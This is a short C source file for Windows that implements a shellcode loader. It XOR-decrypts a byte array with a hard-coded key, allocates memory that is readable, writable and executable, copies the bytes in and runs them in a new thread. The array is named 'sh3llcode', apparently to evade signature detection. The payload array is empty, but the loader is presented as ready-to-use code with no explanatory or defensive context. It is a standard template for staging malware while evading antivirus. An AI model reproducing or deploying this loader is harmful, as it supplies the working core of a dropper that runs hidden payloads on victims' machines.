#include <windows.h>

int main(void) {
    unsigned char sh3llcode[] = "";
    
    char pass[] = "secret";
    unsigned int data_len = sizeof(sh3llcode);
    unsigned int key_len = sizeof(pass) - 1; 
    
    // XOR decryption loop
    for (unsigned int i = 0, j = 0; i < data_len; i++, j = (j + 1) % key_len) {
        sh3llcode[i] = sh3llcode[i] ^ pass[j];
    }
    
    // Allocate executable memory
    LPVOID alloc_mem = VirtualAlloc(NULL, data_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (alloc_mem == NULL) {
        return 1;
    }
    
    // Copy decrypted shellcode to allocated memory
    RtlMoveMemory(alloc_mem, sh3llcode, data_len);
    
    // Create a new thread to execute the shellcode
    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (tHandle != NULL) {
        WaitForSingleObject(tHandle, INFINITE);
        CloseHandle(tHandle);
    }
    
    // Clean allocated memory
    VirtualFree(alloc_mem, 0, MEM_RELEASE);
    
    return 0;
}
